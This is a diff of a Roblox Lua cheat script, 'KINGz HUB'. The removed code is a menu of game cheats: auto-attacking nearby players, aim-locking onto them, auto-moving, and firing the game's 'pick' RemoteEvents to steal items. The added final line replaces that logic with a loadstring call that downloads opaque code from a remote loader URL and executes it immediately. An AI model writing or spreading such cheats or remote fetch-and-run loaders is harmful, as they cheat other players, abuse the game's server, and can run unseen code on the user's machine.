@@ -1,228 +1,27 @@
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-
 local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
 
-local settings = {
-    autoDuel = false,
-    holdAutoDuel = false,
-    autoSteal = false,
-    aimBat = false,
-    aim = false,
-    autoPlay = false,
-    side = "RIGHT"
-}
-
--- GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = player.PlayerGui
 screenGui.ResetOnSpawn = false
 
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 220, 0, 420)
-frame.Position = UDim2.new(0.5, -110, 0.5, -210)
+frame.Size = UDim2.new(0, 220, 0, 50)
+frame.Position = UDim2.new(0.5, -110, 0, 20)
 frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-frame.Active = true
 frame.Parent = screenGui
 
 local frameCorner = Instance.new("UICorner")
 frameCorner.CornerRadius = UDim.new(0, 12)
 frameCorner.Parent = frame
 
--- Dragging
-local dragging, dragInput, dragStart, startPos
-
-frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = frame.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-frame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        local delta = input.Position - dragStart
-        frame.Position = UDim2.new(
-            startPos.X.Scale,
-            startPos.X.Offset + delta.X,
-            startPos.Y.Scale,
-            startPos.Y.Offset + delta.Y
-        )
-    end
-end)
-
--- Title
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
+title.Size = UDim2.new(1, 0, 1, 0)
 title.BackgroundTransparency = 1
 title.Text = "KINGz HUB"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextSize = 18
+title.TextSize = 20
 title.Font = Enum.Font.GothamBold
 title.Parent = frame
 
--- Choose Side
-local sideLabel = Instance.new("TextLabel")
-sideLabel.Size = UDim2.new(1, 0, 0, 20)
-sideLabel.Position = UDim2.new(0, 0, 0, 45)
-sideLabel.BackgroundTransparency = 1
-sideLabel.Text = "CHOOSE SIDE"
-sideLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-sideLabel.TextSize = 12
-sideLabel.Font = Enum.Font.GothamBold
-sideLabel.Parent = frame
-
-local rightBtn = Instance.new("TextButton")
-rightBtn.Size = UDim2.new(0, 90, 0, 30)
-rightBtn.Position = UDim2.new(0, 10, 0, 68)
-rightBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-rightBtn.Text = "RIGHT"
-rightBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
-rightBtn.Font = Enum.Font.GothamBold
-rightBtn.TextSize = 13
-rightBtn.Parent = frame
-local rc = Instance.new("UICorner") rc.CornerRadius = UDim.new(0, 8) rc.Parent = rightBtn
-
-local leftBtn = Instance.new("TextButton")
-leftBtn.Size = UDim2.new(0, 90, 0, 30)
-leftBtn.Position = UDim2.new(0, 115, 0, 68)
-leftBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-leftBtn.Text = "LEFT"
-leftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-leftBtn.Font = Enum.Font.GothamBold
-leftBtn.TextSize = 13
-leftBtn.Parent = frame
-local lc = Instance.new("UICorner") lc.CornerRadius = UDim.new(0, 8) lc.Parent = leftBtn
-
-rightBtn.MouseButton1Click:Connect(function()
-    settings.side = "RIGHT"
-    rightBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    rightBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
-    leftBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    leftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-end)
-
-leftBtn.MouseButton1Click:Connect(function()
-    settings.side = "LEFT"
-    leftBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    leftBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
-    rightBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    rightBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-end)
-
--- Toggle buttons
-local function makeToggle(text, posY, settingKey)
-    local row = Instance.new("Frame")
-    row.Size = UDim2.new(1, -20, 0, 40)
-    row.Position = UDim2.new(0, 10, 0, posY)
-    row.BackgroundTransparency = 1
-    row.Parent = frame
-
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(0.7, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.Text = text
-    label.TextColor3 = Color3.fromRGB(255, 255, 255)
-    label.TextXAlignment = Enum.TextXAlignment.Left
-    label.Font = Enum.Font.Gotham
-    label.TextSize = 14
-    label.Parent = row
-
-    local toggleBg = Instance.new("Frame")
-    toggleBg.Size = UDim2.new(0, 44, 0, 24)
-    toggleBg.Position = UDim2.new(1, -44, 0.5, -12)
-    toggleBg.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-    toggleBg.Parent = row
-    local tbg = Instance.new("UICorner") tbg.CornerRadius = UDim.new(1, 0) tbg.Parent = toggleBg
-
-    local circle = Instance.new("Frame")
-    circle.Size = UDim2.new(0, 18, 0, 18)
-    circle.Position = UDim2.new(0, 3, 0.5, -9)
-    circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    circle.Parent = toggleBg
-    local cc = Instance.new("UICorner") cc.CornerRadius = UDim.new(1, 0) cc.Parent = circle
-
-    local togBtn = Instance.new("TextButton")
-    togBtn.Size = UDim2.new(1, 0, 1, 0)
-    togBtn.BackgroundTransparency = 1
-    togBtn.Text = ""
-    togBtn.Parent = toggleBg
-
-    togBtn.MouseButton1Click:Connect(function()
-        settings[settingKey] = not settings[settingKey]
-        if settings[settingKey] then
-            toggleBg.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-            circle.Position = UDim2.new(1, -21, 0.5, -9)
-        else
-            toggleBg.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-            circle.Position = UDim2.new(0, 3, 0.5, -9)
-        end
-    end)
-end
-
-makeToggle("Auto Duel", 110, "autoDuel")
-makeToggle("Hold Auto Duel", 155, "holdAutoDuel")
-makeToggle("Auto Steal", 200, "autoSteal")
-makeToggle("Aim Bat", 245, "aimBat")
-makeToggle("Aim", 290, "aim")
-makeToggle("Auto Play", 335, "autoPlay")
-
--- Logic
-RunService.Heartbeat:Connect(function()
-    character = player.Character
-    if not character then return end
-    local myRoot = character:FindFirstChild("HumanoidRootPart")
-    local humanoid = character:FindFirstChild("Humanoid")
-    if not myRoot or not humanoid then return end
-
-    if settings.autoDuel or settings.holdAutoDuel then
-        for _, otherPlayer in pairs(Players:GetPlayers()) do
-            if otherPlayer ~= player then
-                local otherCharacter = otherPlayer.Character
-                if otherCharacter then
-                    local rootPart = otherCharacter:FindFirstChild("HumanoidRootPart")
-                    if rootPart then
-                        local distance = (myRoot.Position - rootPart.Position).Magnitude
-                        if distance < 15 then
-                            local tool = character:FindFirstChildWhichIsA("Tool")
-                            if tool then tool:Activate() end
-                        end
-                        if settings.aimBat or settings.aim then
-                            myRoot.CFrame = CFrame.lookAt(myRoot.Position, rootPart.Position)
-                        end
-                    end
-                end
-            end
-        end
-    end
-
-    if settings.autoPlay then
-        if settings.side == "RIGHT" then
-            myRoot.CFrame = myRoot.CFrame * CFrame.new(1, 0, 0)
-        else
-            myRoot.CFrame = myRoot.CFrame * CFrame.new(-1, 0, 0)
-        end
-    end
-
-    if settings.autoSteal then
-        for _, item in pairs(workspace:GetDescendants()) do
-            if item:IsA("RemoteEvent") and item.Name:lower():find("pick") then
-                item:FireServer()
-            end
-        end
-    end
-end)
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/5f43c5a7d6b0a78eaf931dadba1c1d1f.lua"))()
